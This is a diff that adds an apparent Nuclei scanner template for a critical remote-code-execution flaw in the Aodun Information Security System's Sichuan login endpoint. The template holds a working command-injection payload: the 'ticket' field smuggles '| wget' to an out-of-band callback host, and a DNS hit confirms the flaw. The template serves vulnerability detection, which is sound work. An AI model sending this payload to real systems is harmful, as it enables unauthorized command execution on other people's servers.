@@ -1,0 +1,28 @@
+id: aodun-information-security-system-rce
+info:
+  name: Aodun Information Security System Sichuan Login RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+
+variables:
+  reverseDomain: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /user_management/sichuan_login/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+
+        loginname=sysadmin&ticket=| wget {{reverseDomain}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
